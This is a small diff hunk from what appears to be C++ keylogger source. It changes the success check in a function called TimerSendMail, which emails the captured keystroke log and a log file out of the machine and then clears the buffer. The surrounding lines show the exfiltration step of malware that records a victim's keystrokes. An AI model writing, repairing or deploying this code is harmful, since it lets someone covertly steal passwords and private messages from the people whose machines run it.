@@ -29,7 +29,7 @@ void TimerSendMail()
                            "For testing, enjoy:!" + keylog,
                            IO::GetOurPath(true) + last_file);
 
-    if( x != 7)
+    if( x != 0)
         Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
     else
         keylog="";
